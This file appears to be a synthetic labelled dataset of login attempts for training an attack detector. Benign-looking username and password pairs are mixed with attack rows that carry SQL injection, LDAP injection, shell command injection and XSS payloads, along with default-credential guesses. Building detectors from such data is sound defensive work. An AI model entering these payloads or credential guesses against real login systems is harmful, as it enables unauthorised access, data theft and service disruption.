ip,username,password,label
151.240.101.171,AQDEMO,Vision2,1
234.26.240.139,cui,@163.com666,0
243.233.114.206,'%20or%201=1,or%201=1,1
128.165.215.15,hi' or 'a'='a,""" or 0=0 --",1
205.31.241.214,cha,&00aa00bb,0
200.229.78.242,zang,a1b2c3d4),0
162.139.57.205,' or 1=1--,"""hi"""") or (""""a""""=""""a""",1
23.154.127.57,mi,xs_vk1,0
64.88.73.85,murong,1/2zxcvbnm,0
67.91.75.234,jiao,xena21.,0
151.240.101.171,AQDEMO,sangfor@2018,1
128.165.215.15,%2A%28%7C%28objectclass%3D%2A%29%29,|,1
234.26.240.139,cui,@163.com666,0
243.233.114.206,procedure,(sqlattempt2),1
200.229.78.242,zang,a1b2c3d4),0
23.154.127.57,mi,xs_vk1,0
67.91.75.234,jiao,xena21.,0
39.111.41.62,' or username like '%,' or (EXISTS),1
162.139.57.205,""" or 0=0 --",' or user like '%,1
205.31.241.214,cha,&00aa00bb,0
151.240.101.171,AQDEMO,Changeme_123。,1
128.165.215.15,x' AND 1=(SELECT COUNT(*) FROM tabname); --,"hi"" or 1=1 --",1
234.26.240.139,cui,@163.com666,0
243.233.114.206,""" or ""a""=""a",' or username like '%,1
39.111.41.62,//*,%29,1
162.139.57.205,"hi or 1=1 --""",' or username like '%,1
40.186.220.74,deng,Nov-94,0
23.154.127.57,mi,xs_vk1,0
67.91.75.234,jiao,xena21.,0
200.229.78.242,zang,a1b2c3d4),0
128.165.215.15,&apos;%20OR,/,1
151.240.101.171,AQDEMO,waav,1
243.233.114.206,' or a=a--,%21,1
234.26.240.139,cui,@163.com666,0
23.154.127.57,mi,xs_k1,0
39.111.41.62,declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s),declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),1
162.139.57.205,' or user like '%,*/*,1
40.186.220.74,deng,Nov-94,0
67.91.75.234,jiao,xena21.,0
200.229.78.242,zang,a1b2c3d4),0
151.240.101.171,AQDEMO,KEYSCAN,1
128.165.215.15,%2A%28%7C%28mail%3D%2A%29%29,*/*,1
234.26.240.139,cui,@163.com666,0
243.233.114.206,'hi' or 'x'='x';,|,1
162.139.57.205,//*,' or a=a--,1
39.111.41.62,desc,' or 0=0 --,1
209.138.114.179,redline,system,1
40.186.220.74,deng,Nov-94,0
200.229.78.242,zang,a1b2c3d4),0
67.91.75.234,jiao,xena21.,0
151.240.101.171,AQDEMO,vizxv,1
128.165.215.15,select,' or 1=1 or ''=',1
243.233.114.206,--sp_password,%2A%28%7C%28mail%3D%2A%29%29,1
234.26.240.139,cui,@163.com66&,0
40.186.220.74,deng,Nov-94,0
209.138.114.179,redline,converge,1
162.139.57.205,desc,' and 2>3--,1
39.111.41.62,replace,or a=a,1
67.91.75.234,jiao,xena21.,0
200.229.78.242,zang,a1b2c3d4),0
128.165.215.15,or 0=0 --,%2A%7C,1
151.240.101.171,AQDEMO,123456789a,1
234.26.240.139,cui,@163.com666,0
243.233.114.206,' or ''=',order by,1
40.186.220.74,deng,Nov-94,0
209.138.114.179,redline,digicel,1
162.139.57.205,' or username like '%,' or user like '%,1
39.111.41.62,(sqlattempt2),--sp_password,1
67.91.75.234,jiao,xena21.,0
200.229.78.242,zang,a1b2c3d4),0
151.240.101.171,dcmadmin,games,1
128.165.215.15,asc,%29,1
234.26.240.139,cui,@163.com666,0
243.233.114.206,hi') or ('a'='a,@variable,1
209.138.114.179,redline,michelle,1
200.229.78.242,zang,a1b2c3d4),0
162.139.57.205,' or 0=0 --,' or uname like '%,1
40.186.220.74,deng,Nov-94,0
67.91.75.234,jiao,xena21.,0
39.111.41.62,"or 1=1 or """"=",%2A%28%7C%28objectclass%3D%2A%29%29,1
151.240.101.171,dcmadmin,234,1
128.165.215.15,\x27UNION SELECT,' or 1=1--,1
234.26.240.139,cui,@163.com666,0
125.180.128.15,'; exec xp_regread,' and '' like '%,1
209.138.114.179,redline,informix,1
123.185.14.109,QS_ADM,hipchat,1
39.111.41.62,' and '' like '%,--,1
67.91.75.234,jiao,xena21,0
162.139.57.205,insert,""" or ""x""=""x",1
40.186.220.74,deng,Nov-94,0
128.165.215.15,%7C,@variable,1
151.240.101.171,dcmadmin,1RRWTTOOI,1
125.180.128.15,//*,declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),1
234.26.240.139,cui,@163.com666,0
39.111.41.62,' or '1'='1'--,'||UTL_HTTP.REQUEST,1
162.139.57.205,%27%20or%201=1,as,1
40.186.220.74,deng,Nov-94,0
123.185.14.109,QS_ADM,lp,1
209.138.114.179,redline,builtin,1
67.91.75.234,ding,@139.com3721,0
128.165.215.15,declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s),1;SELECT%20*,1
151.240.101.171,dcmadmin,enable,1
125.180.128.15,' or '' like ',&lt;&gt;&quot;'%;)(&amp;+,1
234.26.240.139,cui,@163.com666,0
123.185.14.109,QS_ADM,Password1234,1
40.186.220.74,deng,Nov-94,0
67.91.75.234,ding,@139.com3721,0
162.139.57.205,distinct,';shutdown--,1
209.138.114.179,acer,pento,1
39.111.41.62,%20'sleep%2050',\x27UNION SELECT,1
151.240.101.171,dcmadmin,23646,1
128.165.215.15,x' AND userid IS NULL; --,',1
125.180.128.15,or a = a,(,1
234.26.240.139,cui,@163.com666,0
209.138.114.179,acer,d.e.b.u.g,1
196.134.157.27,tian,1/3connect,0
123.185.14.109,QS_ADM,store,1
39.111.41.62,--';,%2A%7C,1
40.186.220.74,deng,Nov-94,0
67.91.75.234,ding,@139.com3721,0
128.165.215.15,' or 1=1 or ''=',23 OR 1=1,1
151.240.101.171,dcmadmin,QS,1
234.26.240.139,cui,@163.com666,0
125.180.128.15,*/*,--,1
123.185.14.109,QS_ADM,123456789,1
39.111.41.62,//,')%20or%20('x'='x,1
151.240.101.171,dcmadmin,cacadmin,1
196.134.157.27,tian,1/3connect,0
40.186.220.74,deng,Nov-94,0
67.91.75.234,ding,@139.com3721,0
209.138.114.179,acer,0P3N,1
128.165.215.15,hi' or 1=1 --,' and '' like ''--,1
125.180.128.15,|,0 or 1=1,1
234.26.240.139,cui,@163.com666,0
40.186.220.74,deng,Nov-94,0
196.134.157.27,tian,1/3connejt,0
151.240.101.171,cxsdk,service,1
209.138.114.179,acer,TURBINE,1
67.91.75.234,ding,@139.com3721,0
123.185.14.109,hqadmin,WANGTEK,1
128.165.215.15,') and ('x'='x,x' AND email IS NULL; --,1
39.111.41.62,hi' or 'a'='a,%20$(sleep%2050),1
234.26.240.139,cui,@163.com666,0
125.180.128.15,%2A%28%7C%28objectclass%3D%2A%29%29,'%20or%201=1,1
40.186.220.74,deng,Nov-94,0
234.26.240.139,cui,@163.com666,0
151.240.101.171,cxsdk,111111a,1
125.180.128.15,%26,%29,1
67.91.75.234,ding,@139.com3721,0
123.185.14.109,hqadmin,dasusr1,1
128.165.215.15,desc,',1
39.111.41.62,&lt;&gt;&quot;'%;)(&amp;+,exec sp,1
209.138.114.179,acer,MTRPW,1
196.134.157.27,tian,1/3connect,0
40.186.220.74,deng,Nov-94,0
196.134.157.27,tian,1/3connect,0
39.111.41.62,like,\x3D \x27,1
209.138.114.179,OLAPDBA,19920706,1
67.91.75.234,ding,@139.com3721,0
125.180.128.15,distinct,exec xp,1
234.26.240.139,cui,@163.com666,0
128.165.215.15,//,'%20or%20''=',1
151.240.101.171,cxsdk,DIP,1
123.185.14.109,hqadmin,shell,1
40.186.220.74,deng,Nov-94,0
209.138.114.179,OLAPDBA,sangfor@2019,1
39.111.41.62,' or 1=1--,desc,1
67.91.75.234,ding,@139.com3721,0
125.180.128.15,= ',%7C,1
234.26.240.139,cui,@163.com666,0
151.240.101.171,cxsdk,MGR.SYS,1
123.185.14.109,hqadmin,1qaz!QAZ,1
196.134.157.27,tian,1/3connect,0
128.165.215.15,or 0=0 --,' or 1=1--,1
40.186.220.74,deng,Nov-94,0
39.111.41.62,*|,or,1
196.134.157.27,tian,1/3connect,0
123.185.14.109,hqadmin,adslroot,1
209.138.114.179,OLAPDBA,DISC,1
234.26.240.139,cui,@163.com666,0
151.240.101.171,cxsdk,TOAD,1
128.165.215.15,x' AND members.email IS NULL; --,desc,1
67.91.75.234,ding,@139.com3721,0
125.180.128.15,%28,PRINT @@variable,1
40.186.220.74,deng,Nov-94,0
196.134.157.27,tian,1/3connect,0
123.185.14.109,hqadmin,MGR.SYS,1
67.91.75.234,ding,@139.com3721,0
125.180.128.15,x' or 1=1 or 'x'='y,or 0=0 #,1
151.240.101.171,cxsdk,CDEMOUCB,1
234.26.240.139,cui,@163.com666,0
209.138.114.179,OLAPDBA,m9ff.QW,1
39.111.41.62,' or 0=0 --,') or ('a'='a,1
128.165.215.15,%2A%7C,limit,1
40.186.220.74,deng,Nv-94,0
151.240.101.171,cxsdk,hockey,1
209.138.114.179,OLAPDBA,BASE,1
40.186.220.74,deng,Nov-94,0
123.185.14.109,hqadmin,1234admin,1
125.180.128.15,' or username like '%,\x27\x6F\x72 SELECT *,1
234.26.240.139,cui,@163.com666,0
196.134.157.27,tian,1/3connect,0
128.165.215.15,replace,' or username like '%,1
67.91.75.234,ding,@13.com3721,0
39.111.41.62,|,"<>""'%;)(&+",1
151.240.101.171,cxsdk,qxcommsupport,1
234.26.240.139,cui,@163.com666,0
125.180.128.15,",@variable",' UNION SELECT,1
123.185.14.109,hqadmin,2580,1
196.134.157.27,tian,1/3connectg,0
67.91.75.234,ding,@139.com3721,0
39.111.41.62,' (select top 1,PRINT @@variable,1
40.186.220.74,deng,Nov-94,0
209.138.114.179,PORTAL30,taylor,1
62.94.60.181,"<FRAMESET><FRAME SRC=""javascript:alert(1673);""></FRAMESET>","<STYLE>.XSS{background-image:url(""javascript:alert(1664)"");}</STYLE><A CLASS=XSS></A>",1
151.240.101.171,cxsdk,qwertyuiop,1
196.134.157.27,tian,1/3connect,0
234.26.240.139,han,.org4444444,0
62.94.60.181,"<TABLE BACKGROUND=""javascript:alert(760)"">","<STYLE>.XSS{background-image:url(""javascript:javascript:alert(688)"");}</STYLE><A CLASS=XSS></A>",1
125.180.128.15,23 OR 1=1,' UNION SELECT,1
67.91.75.234,ding,@139.com3721,0
209.138.114.179,PORTAL30,ORAREGSYS,1
123.185.14.109,LIBRARY,masterkey,1
39.111.41.62,delete,|,1
40.186.220.74,deng,Nov-94,0
151.240.101.171,mtcl,admn,1
125.180.128.15,' or a=a--,' or 0=0 --,1
62.94.60.181,"<IMG STYLE=""xss:expr/*XSS*/ession(alert(747))"">","ABC<div style=""x:\xE2\x80\x84expression(javascript:alert(415)"">DEF",1
234.26.240.139,han,.org4444444,0
196.134.157.27,tian,1/3connect,0
39.111.41.62,%20$(sleep%2050),or 0=0 --,1
67.91.75.234,ding,@139.com371,0
123.185.14.109,LIBRARY,console,1
209.138.114.179,PORTAL30,secret,1
40.186.220.74,deng,Nov-94,0
151.240.101.171,mtcl,NETBASE,1
62.94.60.181,<script>({0:#0=eval/#0#/#0#(javascript:alert(1563))})</script>,<SCRIPT onreadystatechange=javascript:javascript:alert(1614);></SCRIPT>,1
234.26.240.139,han,.org4444444,0
196.134.157.27,tian,1/3connect,0
125.180.128.15,' or username like '%,admin'--,1
123.185.14.109,LIBRARY,qweasdzxc,1
209.138.114.179,PORTAL30,!manage,1
39.111.41.62,' aND '' like '%,limit,1
40.186.220.74,deng,Nov-94,0
67.91.75.234,ding,@139.com3721,0
151.240.101.171,mtcl,BC4J,1
196.134.157.27,tian,1/3connect,0
234.26.240.139,han,.org4444444,0
125.180.128.15,PRINT @@variable,' or uname like '%,1
62.94.60.181,"<meta content=""&NewLine; 1686 &NewLine;; JAVASCRIPT&colon; alert(1686)"" http-equiv=""refresh""/>",<a onmouseover=alert(1000)>xxs link</a>,1
209.138.114.179,PORTAL30,infrant1,1
40.186.220.74,deng,NovH-94,0
123.185.14.109,LIBRARY,browsepw,1
67.91.75.234,ding,@139.com3721,0
39.111.41.62,%26,'%20or%201=1,1
151.240.101.171,mtcl,SMDR,1
62.94.60.181,"<frameset onScroll frameset onScroll=""javascript:javascript:alert(1198)""></frameset onScroll>",echo('IPT&gt;alert(913)&lt;/SCRIPT&gt;'); ?&gt;,1
196.134.157.27,tian,1/3connect,0
234.26.240.139,han,.org4444444,0
125.180.128.15,' ;,*(|(mail=*)),1
123.185.14.109,LIBRARY,jasperadmin,1
40.186.220.74,deng,Nov-94,0
209.138.114.179,PORTAL30,netscreen,1
39.111.41.62,'hi' or 'x'='x';,' or 3=3,1
67.91.75.234,ding,@139.com372-1,0
151.240.101.171,mtcl,toor,1
62.94.60.181,%BCscript%BEalert(1822)%BC/script%BE,<brute oncopy=alert(175)>copy this!,1
234.26.240.139,han,.org4444444,0
196.134.157.27,tian,1/3connect,0
125.180.128.15,as,or%201=1 --,1
123.185.14.109,LIBRARY,sys123,1
39.111.41.62,hi') or ('a'='a,declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q),1
40.186.220.74,deng,Nov-94,0
67.91.75.234,ding,@139.com3721,0
209.138.114.179,PORTAL30,SMDR,1
151.240.101.171,mtcl,COMPANY,1
234.26.240.139,han,.org4444444,0
196.134.157.27,tian,1/3connect,0
125.180.128.15,'sqlattempt1,&,1
62.94.60.181,"perl -e 'print \""&lt;SCR\0IPT&gt;alert(920)&lt;/SCR\0IPT&gt;\"";' &gt; out","<META HTTP-EQUIV=\""refresh\"" CONTENT=\""0; URL=http://;URL=javascript:alert(1747);\"">",1
209.138.114.179,PORTAL30,asd123456789,1
123.185.14.109,LIBRARY,pwPower,1
39.111.41.62,a' or 1=1--,#,1
67.91.75.234,ding,@139.com3721,0
40.186.220.74,deng,Nov-94,0
151.240.101.171,mtcl,db2pw,1
196.134.157.27,tian,1/3connect,0
234.26.240.139,han,.org4444444,0
123.185.14.109,LIBRARY,root,1
125.180.128.15,or 0=0 --,replace,1
62.94.60.181,<script>alert(1713);</script>,<img src=`%00`&NewLine; onerror=alert(769)&NewLine;,1
39.111.41.62,as,//,1
209.138.114.179,csadmin,SYMPA,1
67.91.75.234,ding,@139.com3721,0
40.186.220.74,deng,zNov-94,0
151.240.101.171,ftp_nmc,QLogic66,1
196.134.157.27,tian,1/3connect,0
234.26.240.139,han,.org4444444,0
40.186.220.74,cheng,222222222c++,0
164.155.50.86,han,wkn976403;,0
67.91.75.234,ding,@139.com3721,0
62.94.60.181,"ABC<div style=""x:\xE2\x80\x80expression(javascript:alert(417)"">DEF",<svg><script onlypossibleinopera:-)> alert(833),1
209.138.114.179,csadmin,klv123,1
123.185.14.109,LIBRARY,ARCHIVIST,1
125.180.128.15,%20$(sleep%2050),' or '1'='1'--,1
151.240.101.171,ftp_nmc,weblogic1,1
234.26.240.139,han,.org4444444,0
196.134.157.27,tian,1/3connect,0
125.180.128.15,update,or%201=1 --,1
123.185.14.109,LIBRARY,x40rocks,1
164.155.50.86,han,wkn976403;,0
209.138.114.179,csadmin,SAPR3,1
67.91.75.234,ding,@139.com3721,0
62.94.60.181,"<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1583)>","<svg onUnload svg onUnload=""javascript:javascript:alert(1226)""></svg onUnload>",1
40.186.220.74,cheng,222222222c++,0
151.240.101.171,ftp_nmc,19920706,1
196.134.157.27,tian,1/3connect,0
234.26.240.139,han,.org4444444,0
62.94.60.181,"ABC<div style=""x:\x0Aexpression(javascript:alert(1311)"">DEF","<script src=1192 href=1192 onerror=""javascript:alert(1192)""></script>",1
67.91.75.234,ding,@139.com3721,0
209.138.114.179,csadmin,sangfor,1
123.185.14.109,ARCHIVIST,Zte521,1
125.180.128.15,"""' or 1 --'""",or%201=1,1
40.186.220.74,cheng,222222222c++,0
164.155.50.86,han,wkn976403;,0
151.240.101.171,ftp_nmc,solarfocus,1
234.26.240.139,han,.org4444444,0
187.109.12.5,mei,xxSy4Dy6d1LK.,0
40.186.220.74,cheng,222222222c++,0
164.155.50.86,han,wkn976403;,0
62.94.60.181,&lt;IMG SRC=&quot;jav&#x09;ascript:alert(1847);&quot;&gt;,"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert(737);"">",1
123.185.14.109,ARCHIVIST,Huawei13#$,1
209.138.114.179,csadmin,sysadmpw,1
33.50.170.191,dev,resumix,1
67.91.75.234,ding,@139.com3721,0
151.240.101.171,ftp_nmc,1q2w3e4r,1
187.109.12.5,mei,xxSy4Dy6d1LK.,0
234.26.240.139,han,.org4444444,0
209.138.114.179,csadmin,nsi,1
164.155.50.86,han,wkn976403;,0
123.185.14.109,ARCHIVIST,logapp,1
40.186.220.74,cheng,222222222c++,0
62.94.60.181,"`""'><img src=xxx:x onerror\x0B=javascript:alert(554)>","<TABLE BACKGROUND=""javascript:alert(760)"">",1
33.50.170.191,dev,a,1
67.91.75.234,ding,@139.com3721,0
151.240.101.171,ftp_nmc,autocad,1
234.26.240.139,han,.org4444444,0
187.109.12.5,mei,xxSy4Dy6d1LK.,0
62.94.60.181,"`""'><img src=xxx:x \x0Conerror=javascript:alert(497)>","ABC<div style=""x:\xE2\x80\x88expression(javascript:alert(424)"">DEF",1
118.13.144.244,"<body onLoad body onLoad=""javascript:javascript:alert(307)""></body onLoad>","<head><base href=""javascript://""></head><body><a href=""/. /,javascript:alert(580)//#"">XXX</a></body>",1
40.186.220.74,cheng,222222222c++,0
33.50.170.191,dev,mlusr,1
164.155.50.86,han,wkn976403;,0
123.185.14.109,ARCHIVIST,PORTAL31,1
67.91.75.234,ding,@139.com3721,0
151.240.101.171,ftp_nmc,dmr99,1
187.109.12.5,mei,xxSy4Dy6d1LK.,0
234.26.240.139,han,.org4444444,0
123.185.14.109,ARCHIVIST,SECAdmin1,1
118.13.144.244,"<img \x600600src=x onerror=""javascript:alert(600)"">","""`'><script>\x2Bjavascript:alert(516)</script>",1
62.94.60.181,"<math href=""javascript:javascript:alert(1486)"">CLICKME</math>  <math> <maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:javascript:alert(1486)"">CLICKME</maction> </math>","<a href=""\xE2\x80\x80javascript:javascript:alert(1342)"" id=""fuzzelement1342"">test</a>",1
40.186.220.74,cheng,222222222c++,0
164.155.50.86,han,wkn976403;,0
33.50.170.191,dev,FOOBAR,1
67.91.75.234,ding,@139.com3721,0
151.240.101.171,ftp_nmc,adm,1
187.109.12.5,mei,xxSy4Dy6d1LK.,0
234.26.240.139,han,.org4444444,0
62.94.60.181,"<? foo=""><script>alert(964)</script>"">",<x onmousedown=alert(167)>click this!,1
123.185.14.109,ARCHIVIST,dbpass,1
118.13.144.244,"<DIV STYLE=""width: expression(alert(259));"">","`""'><img src=xxx:x onerror\x00=javascript:alert(1469)>",1
40.186.220.74,cheng,2^22222222c++,0
33.50.170.191,dev,telus99,1
164.155.50.86,han,wkn976403;,0
221.91.129.166,nie,.net770880,0
151.240.101.171,ftp_nmc,TJM,1
187.109.12.5,mei,xxSy4Dy6d1LK.,0
234.26.240.139,han,.org4444444,0
33.50.170.191,pmd,changeme!,1
40.186.220.74,cheng,222222222c++,0
123.185.14.109,rje,leadsec.waf,1
164.155.50.86,han,wkn976403;,0
62.94.60.181,<IMG SRC=&{javascript:alert(707);};>,"""`'><script>\x0Ajavascript:alert(519)</script>",1
118.13.144.244,"<IMG SRC=x ondragenter=""alert(1097))"">","<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert(1049);+ADw-/SCRIPT+AD4-",1
221.91.129.166,nie,.net770880,0
151.240.101.171,ftp_nmc,redips,1
187.109.12.5,mei,xxSy4Dy6d1LK.,0
234.26.240.139,han,.org4444444,0
62.94.60.181,"<STYLE>.XSS{background-image:url(""javascript:alert(1664)"");}</STYLE><A CLASS=XSS></A>","<a href=http://foo.bar/#x=`y></a><img alt=""`><img src=x:x onerror=javascript:alert(636)></a>"">",1
40.186.220.74,cheng,222222222c++,0
118.13.144.244,"<IFRAME SRC=""javascript:alert(757);""></IFRAME>",</style &#32;><script &#32; :-(>/**/alert(815)/**/</script &#32; :-(,1
123.185.14.109,rje,MXAGENT,1
33.50.170.191,pmd,asd,1
164.155.50.86,han,wkn976403;,0
221.91.129.166,nie,.net770880,0
151.240.101.171,sysbin,xbox,1
187.109.12.5,mei,xxSy4Dy6d1LK.,0
234.26.240.139,han,.org4444444,0
40.186.220.74,cheng,222222222c++,0
62.94.60.181,"<BASE HREF=""javascript:alert(1679);//"">","<IMG SRC=""javascript.:alert(234);"">",1
118.13.144.244,"""`'><script>\x2531javascript:alert(531)</script>","<! foo=""[[[Inception]]""><x foo=""]foo><script>alert(874)</script>"">",1
164.155.50.86,han,wkn976403;,0
123.185.14.109,rje,123456abc.,1
33.50.170.191,pmd,primeos,1
221.91.129.166,nie,.net770880,0
151.240.101.171,sysbin,Admin@huawei,1
187.109.12.5,mei,xxSy4Dy6d1LK.,0
234.26.240.139,han,.org4444444,0
123.185.14.109,rje,camera,1
40.186.220.74,cheng,222222222c++,0
118.13.144.244,"`""'><img src=xxx:x onerror\x0A=javascript:alert(559)>",654<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x4654vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(654)&gt;`>,1
164.155.50.86,han,wkn976403;,0
62.94.60.181,"<a href=""\x1346Ajavascript:javascript:alert(1346)"" id=""fuzzelement1346"">test</a>","&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(1858)&gt;",1
33.50.170.191,pmd,default,1
221.91.129.166,nie,.net770880,0
151.240.101.171,sysbin,michelle,1
234.26.240.139,han,.org4444444,0
187.109.12.5,mei,xxSy4Dy6d1LK.,0
164.155.50.86,han,wkn976403;,0
123.185.14.109,rje,m9ff.QW,1
40.186.220.74,cheng,222222222c++,0
62.94.60.181,"<body onLoad body onLoad=""javascript:javascript:alert(1206)""></body onLoad>",%BCscript%BEalert(1822)%BC/script%BE,1
33.50.170.191,pmd,live,1
118.13.144.244,"""`'><script>\x0Djavascript:alert(1401)</script>",</TITLE><SCRIPT>alert(944);</SCRIPT>,1
221.91.129.166,nie,.net770880,0
151.240.101.171,sysbin,muze,1
234.26.240.139,han,.org4444444,0
187.109.12.5,mei,xxSy4Dy6d1LK.,0
40.186.220.74,cheng,222222222c++,0
164.155.50.86,han,wk6n976403;,0
123.185.14.109,viewer,D@rj33l1ng,1
62.94.60.181,<STYLE>@im\port'\ja\vasc\ript:alert(260)';</STYLE>,"<a href=""jav&#65ascript:javascript:alert(708)"">test708</a>",1
33.50.170.191,pmd,OSP22,1
118.13.144.244,"<a href=""\xE2\x80\x89javascript:javascript:alert(442)"" id=""fuzzelement442"">test</a>","<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:javascript:alert(678);"">",1
221.91.129.166,nie,.net770880,0
151.240.101.171,sysbin,VCSRV,1
234.26.240.139,han,.org4444444,0
187.109.12.5,mei,xxSy4Dy6d1LK,0
33.50.170.191,pmd,isdev,1
40.186.220.74,cheng,222222222c++,0
123.185.14.109,viewer,nq,1
62.94.60.181,<// style=x:expression\28javascript:alert(1559)\29>,"<a href=""javas\x0374cript:javascript:alert(374)"" id=""fuzzelement374"">test</a>",1
164.155.50.86,han,wkn76403;,0
118.13.144.244,"<embed src=""javascript:alert(963)"">",<brute ondrag=alert(179)>drag this!,1
221.91.129.166,nie,.net770880,0
198.93.42.8,‘ or 3=3 --,') or ('a'='a,1
234.26.240.139,han,.org4444444,0
187.109.12.5,mei,xxSy4Dy6d1LK.,0
62.94.60.181,<img src ?itworksonchrome?\/onerror = alert(1705),+ADw-script+AD4-alert(974)+ADw-/script+AD4-,1
118.13.144.244,"""/><img/onerror=\x09javascript:alert(1439)\x09src=xxx:x />","""`'><script>\xE2\x80\x81403javascript:alert(1403)</script>",1
164.155.50.86,han,wkn976403;,0
40.186.220.74,cheng,222222222c++,0
123.185.14.109,viewer,j322,1
33.50.170.191,REPORTS_USER,123456a.,1
221.91.129.166,nie,.net770880,0
198.93.42.8,%2A%7C,' UNION SELECT,1
234.26.240.139,luan,china1/3,0
187.109.12.5,mei,xxSy4Dy6d1LK.,0
123.185.14.109,viewer,REMOTE,1
31.106.223.134,SYSTEST_CLIG,zbaaaca,1
164.155.50.86,han,wkn976403;,0
33.50.170.191,REPORTS_USER,yesco,1
40.186.220.74,cheng,222222222c++,0
118.13.144.244,"<a style=""-o-link:'javascript:javascript:alert(1554)';-o-link-source:current"">X","<video onerror=""javascript:javascript:alert(1483)""><source>",1
221.91.129.166,nie,.net770880,0
198.93.42.8,handler,x' or 1=1 or 'x'='y,1
234.26.240.139,luan,china1/3,0
187.109.12.5,mei,xxSy4Dy6d1LK.,0
40.186.220.74,cheng,2222v22222c++,0
118.13.144.244,"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(732)>",<math><brute xlink:href=javascript:alert(218)>click,1
123.185.14.109,viewer,QDBA,1
31.106.223.134,SYSTEST_CLIG,ABCD,1
164.155.50.86,han,wkn976403;,0
33.50.170.191,REPORTS_USER,iloveyou,1
221.91.129.166,nie,.net770880,0
198.93.42.8,%29,or,1
234.26.240.139,luan,chna1/3,0
187.109.12.5,mei,xxSy4Dy6d1LK.,0
31.106.223.134,SYSTEST_CLIG,PROG,1
118.13.144.244,"<iframe src iframe src=""javascript:javascript:alert(348)""></iframe src>",1570<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1570) strokecolor=white strokeweight=1570000px from=0 to=1570000 /></a>,1
123.185.14.109,support,col1ma,1
164.155.50.86,han,wkn976403;,0
40.186.220.74,cheng,222222222c++,0
33.50.170.191,REPORTS_USER,HOST,1
221.91.129.166,nie,.net770880,0
198.93.42.8,'sqlattempt1,|,1
187.109.12.5,mei,xxSy4Dy6d1LK.,0
234.26.240.139,luan,china1/3,0
40.186.220.74,cheng,222222222c++,0
33.50.170.191,REPORTS_USER,PAPER,1
31.106.223.134,SYSTEST_CLIG,pass1,1
123.185.14.109,support,dbpass,1
118.13.144.244,"<svg onResize svg onResize=""javascript:javascript:alert(294)""></svg onResize>","ABC<div style=""x:\x00expression(javascript:alert(1324)"">DEF",1
164.155.50.86,han,wkn976403;,0
221.91.129.166,nie,.net770880,0
198.93.42.8,having,limit,1
234.26.240.139,luan,china1/3,0
187.109.12.5,mei,xxSy4Dy6d1LK.,0
123.185.14.109,support,123abc,1
40.186.220.74,cheng,222222222c++,0
31.106.223.134,SYSTEST_CLIG,ftp,1
33.50.170.191,REPORTS_USER,leaves,1
118.13.144.244,"<script charset=""\x22>javascript:alert(1256)</script>","<a href=""\xE2\x80\x88javascript:javascript:alert(441)"" id=""fuzzelement441"">test</a>",1
164.155.50.86,han,wkn976403;,0
221.91.129.166,nie,.net770880,0
198.93.42.8,' or uname like '%,PRINT,1
234.26.240.139,luan,china1/3,0
187.109.12.5,mei,xxSy4Dy6d1LK.,0
33.50.170.191,REPORTS_USER,advcomm500349,1
118.13.144.244,"&lt;IMG \""\""\""&gt;&lt;SCRIPT&gt;alert(927)&lt;/SCRIPT&gt;\""&gt;","<a href=""\x4569javascript:javascript:alert(456)"" id=""fuzzelement456"">test</a>",1
123.185.14.109,support,abcABC123,1
40.186.220.74,cheng,222222222c++,0
31.106.223.134,developers,elux,1
164.155.50.86,han,wkn976403;,0
221.91.129.166,nie,.net770880,0
198.93.42.8,exec sp,' UNION SELECT,1
187.109.12.5,mei,xxSy4Dy6d1LK.,0
234.26.240.139,luan,china1/3,0
31.106.223.134,developers,secure,1
